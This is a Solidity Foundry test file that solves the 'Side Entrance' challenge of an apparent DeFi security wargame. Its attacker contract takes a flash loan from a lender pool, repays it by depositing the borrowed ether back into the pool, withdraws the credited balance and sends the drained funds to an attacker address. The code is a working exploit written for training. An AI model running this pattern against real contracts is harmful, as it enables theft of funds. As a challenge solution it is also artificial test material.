// SPDX-License-Identifier: MIT
pragma solidity >=0.8.0;

import {Utilities} from "../../utils/Utilities.sol";
import "forge-std/Test.sol";

import {SideEntranceLenderPool} from "../../../src/Contracts/side-entrance/SideEntranceLenderPool.sol";

contract SideEntrance is Test {
    uint256 internal constant ETHER_IN_POOL = 1_000e18;

    Utilities internal utils;
    SideEntranceLenderPool internal sideEntranceLenderPool;
    address payable internal attacker;
    uint256 public attackerInitialEthBalance;

    function setUp() public {
        utils = new Utilities();
        address payable[] memory users = utils.createUsers(1);
        attacker = users[0];
        vm.label(attacker, "Attacker");

        sideEntranceLenderPool = new SideEntranceLenderPool();
        vm.label(address(sideEntranceLenderPool), "Side Entrance Lender Pool");

        vm.deal(address(sideEntranceLenderPool), ETHER_IN_POOL);

        assertEq(address(sideEntranceLenderPool).balance, ETHER_IN_POOL);

        attackerInitialEthBalance = address(attacker).balance;

        console.log(unicode"🧨 Let's see if you can break it... 🧨");
    }

    function testSideEntranceExploit() public {
        /**
         * EXPLOIT START *
         */
        console2.log("starting attacker address balance: ", attacker.balance);
        console2.log("starting pool ether balance: ", address(sideEntranceLenderPool).balance);

        vm.startPrank(attacker);    

        SideEntranceAttacker sideEntranceAttacker = new SideEntranceAttacker(address(sideEntranceLenderPool), address(attacker));
        sideEntranceAttacker.flashLoan();

        console2.log("pool ether balance: ", address(sideEntranceLenderPool).balance);

        sideEntranceAttacker.withdraw();

        console2.log("ending pool ether balance: ", address(sideEntranceLenderPool).balance);

        console2.log("ending attacker contract balance: ", address(sideEntranceAttacker).balance);
        // send funds from SideEntranceAttacker contract to attacker address
        sideEntranceAttacker.sendFundsToAttacker(attacker);

        console2.log("ending attacker address balance: ", attacker.balance);
        /**
         * EXPLOIT END *
         */
        validation();
        console.log(unicode"\n🎉 Congratulations, you can go to the next level! 🎉");
    }

    function validation() internal {
        assertEq(address(sideEntranceLenderPool).balance, 0);
        assertGt(attacker.balance, attackerInitialEthBalance);
    }
}




interface IFlashLoanEtherReceiver {
    function execute() external payable;
}

contract SideEntranceAttacker is IFlashLoanEtherReceiver {
    SideEntranceLenderPool internal sideEntranceLenderPool;
    address payable internal attacker;
    uint256 internal constant ETHER_IN_POOL = 1_000e18;

    constructor(address _sideEntranceLenderPool, address _attacker) {
        sideEntranceLenderPool = SideEntranceLenderPool(_sideEntranceLenderPool);
        attacker = payable(_attacker);
    }

    function flashLoan() external {
        sideEntranceLenderPool.flashLoan(ETHER_IN_POOL);
    }

    function execute() external override payable {
        sideEntranceLenderPool.deposit{value: msg.value}();

    }

    function withdraw() external {
        sideEntranceLenderPool.withdraw();
    }

    function sendFundsToAttacker(address _attacker) external {
        payable(_attacker).call{value: address(this).balance}("");
    }

    receive() external payable {}
}